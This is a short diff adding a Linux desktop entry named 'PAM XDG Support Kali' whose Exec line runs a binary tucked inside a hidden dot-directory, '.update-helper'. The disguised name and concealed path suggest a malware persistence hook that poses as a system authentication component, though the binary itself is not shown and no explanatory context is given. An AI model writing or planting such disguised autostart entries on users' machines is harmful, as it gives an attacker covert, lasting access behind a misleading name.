@@ -1,0 +1,5 @@
+[Desktop Entry]
+Type=Application
+Name=PAM XDG Support Kali
+Exec=/home/kali/.local/share/.update-helper/.update-helper
+Hidden=false
